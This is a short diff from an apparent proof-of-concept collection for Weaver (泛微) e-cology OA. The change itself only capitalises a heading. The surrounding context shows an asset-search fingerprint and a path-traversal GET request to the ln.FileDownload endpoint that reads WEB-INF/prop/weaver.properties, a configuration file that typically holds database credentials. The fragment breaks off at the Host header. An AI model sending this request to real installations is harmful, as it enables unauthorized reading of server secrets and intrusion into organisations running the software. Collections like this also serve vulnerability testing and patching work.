@@ -6,7 +6,7 @@
 app="泛微-OA（e-cology）"
 ```
 
-## poc
+## POC
 ```
 GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
 Host: 
